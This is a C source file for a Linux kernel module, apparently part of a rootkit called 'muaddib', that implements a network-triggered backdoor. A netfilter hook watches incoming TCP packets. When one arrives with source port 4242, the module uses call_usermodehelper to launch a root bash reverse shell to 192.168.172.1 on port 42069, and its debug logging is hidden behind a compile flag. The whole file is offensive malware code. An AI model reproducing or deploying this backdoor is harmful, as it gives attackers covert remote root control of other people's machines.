#include <linux/workqueue.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/kmod.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>

#define REVERSE_SHELL_IP "192.168.172.1"
#define REVERSE_SHELL_PORT "42069"

#define PATH "PATH=/sbin:/bin:/usr/sbin:/usr/bin"
#define HOME "HOME=/root"
#define TERM "TERM=xterm-256color"
#define SHELL "/bin/bash"
#define EXEC_P1 "bash -i >& /dev/tcp/"
#define EXEC_P2 "0>&1"

#define SRCPORT_FILT 4242

struct shell_params {
	struct work_struct work;
	char* target_ip;
	char* target_port;
};

void execute_reverse_shell(struct work_struct *work){
    int err;
    struct shell_params *params = (struct shell_params*)work;
    char *envp[] = {HOME, TERM, params->target_ip, params->target_port, NULL};
    char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
    char *argv[] = {SHELL, "-c", exec, NULL};
    strcat(exec, EXEC_P1);
    strcat(exec, params->target_ip);
	strcat(exec, "/");
    strcat(exec, params->target_port);
	strcat(exec, " ");
    strcat(exec, EXEC_P2);
	#ifdef DEBUGMSG
    printk(KERN_INFO "muaddib: Starting reverse shell %s\n", exec);
	#endif

    err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if(err<0){
        printk(KERN_INFO "muaddib: Error executing usermodehelper.\n");
    }
    kfree(exec);
    kfree(params->target_ip);
    kfree(params->target_port);
    kfree(params);

}

int start_reverse_shell(char* ip, char* port){
    int err;
    struct shell_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
    if(!params){
		#ifdef DEBUGMSG
        printk(KERN_INFO "muaddib: Error allocating memory\n");
		#endif
        return 1;
    }
    params->target_ip = kstrdup(ip, GFP_KERNEL);
    params->target_port = kstrdup(port, GFP_KERNEL);
    INIT_WORK(&params->work, &execute_reverse_shell);

    err = schedule_work(&params->work);
    if(err<0){
		#ifdef DEBUGMSG
        printk(KERN_INFO "muaddib: Error scheduling work of starting shell\n");
		#endif
    }
    return err;

}


unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state){
    //Network headers
    struct iphdr *ip_header;        //ip header
    struct tcphdr *tcp_header;      //tcp header
    struct sk_buff *sock_buff = skb;//sock buffer
    struct tcphdr _tcphdr;
    struct iphdr _iph;
    //char port[16];

    if (!sock_buff){
        return NF_ACCEPT; //socket buffer empty
    }

    ip_header = skb_header_pointer(skb, 0, sizeof(_iph), &_iph);
    //ip_header = (struct iphdr *)skb_network_header(sock_buff);
    if (!ip_header){
        return NF_ACCEPT;
    }

    //Backdoor trigger: TCP
    if(ip_header->protocol==IPPROTO_TCP){
        unsigned int dport;
        unsigned int sport;

        tcp_header = skb_header_pointer(skb, ip_header->ihl * 4, sizeof(_tcphdr), &_tcphdr);
        //tcp_header= (struct tcphdr*)((unsigned int*)ip_header+ ip_header->ihl);

        sport = htons((unsigned short int) tcp_header->source);

        if(sport == SRCPORT_FILT){
            start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
            return NF_ACCEPT;
        }

        dport = htons((unsigned short int) tcp_header->dest);
        if(dport != 9000){
            return NF_ACCEPT; //We ignore those not for port 9000
        }

	}
	return NF_ACCEPT;
}

static struct nf_hook_ops nfho;

/**
 * Registers predefined nf_hook_ops
 */
int register_netfilter_hook(void){
    int err;

    nfho.hook = net_hook;
    nfho.pf = PF_INET;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.priority = NF_IP_PRI_FIRST;

    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
        err = nf_register_net_hook(&init_net, &nfho);
    #else
        err = nf_register_hook(&nfho);
    #endif
    if(err<0){
		#ifdef DEBUGMSG
		printk(KERN_INFO "muaddib: Error registering nf hook");
		#endif
    }else{
		#ifdef DEBUGMSG
        printk(KERN_INFO "muaddib: Registered nethook");
		#endif
    }

    return err;
}

/**
 * Unregisters predefined nf_hook_ops
 */
void unregister_netfilter_hook(void){
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
        nf_unregister_net_hook(&init_net, &nfho);
    #else
        nf_unregister_hook(&nfho);
    #endif
	#ifdef DEBUGMSG
    	printk(KERN_INFO "muaddib: Unregistered nethook");
	#endif

}
